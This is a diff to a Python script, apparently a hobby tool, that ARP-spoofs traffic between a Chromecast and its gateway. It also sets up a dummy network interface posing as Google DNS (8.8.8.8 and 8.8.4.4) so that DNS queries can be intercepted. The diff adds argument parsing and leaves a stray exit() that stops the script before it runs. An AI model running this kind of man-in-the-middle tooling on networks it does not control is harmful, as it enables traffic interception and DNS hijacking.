@@ -26,14 +26,24 @@ def thread_spoof(target1, target2):
 
 
 def argParser():
-    #WIP
-    return
+    if len(sys.argv) < 2:
+        print("Please call script with the ip of your chromecast")
+        exit()
+    elif len(sys.argv) < 3:
+        tmp = sys.argv[1].split('.')
+        target2 = tmp[0] + "." + tmp[1] + "." + tmp[2] + ".1"
+        print("Assuming default gateway is: " + target2)
+    else:
+        target2 = sys.argv[2]
+
+    target1 = sys.argv[1]
+
+    return target1, target2
 
 
 def main():
-    target1 = sys.argv[1]
-    target2 = sys.argv[2]
-
+    targets = argParser()
+    exit()
     print("----------------------------------")
     print("Creating Virtual NIC eth10 with ip: 8.8.8.8 & 8.8.4.4")
     bash = "modprobe dummy && ip link add eth10 type dummy && ip addr add 8.8.8.8/0 brd + dev eth10 label eth10:0 && ip addr add 8.8.4.4/0 brd + dev eth10 label eth10:1"
@@ -44,23 +54,21 @@ def main():
     print("----------------------------------")
 
     print("Starting ARP spoofer thread...")
-    _thread.start_new_thread(thread_spoof, (target1, target2))
-    _thread.start_new_thread(thread_spoof, (target2, target1))
+    _thread.start_new_thread(thread_spoof, (targets[0], targets[1]))
+    _thread.start_new_thread(thread_spoof, (targets[1], targets[0]))
     print("Success!")
     print("----------------------------------")
 
     try:
         while True:
             #WIP
-            #pkts = sniff(count=1, filter="host 8.8.8.8 or host " + target + " and  port 53")
-            #print(pkts)
             pass
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
         bash = "ip link delete eth10 type dummy"
         os.system(bash)
-        spoofer.restore(target1, target2)
-        spoofer.restore(target2, target1)
+        spoofer.restore(targets[0], targets[1])
+        spoofer.restore(targets[1], targets[0])
 
 
 if __name__ == '__main__':
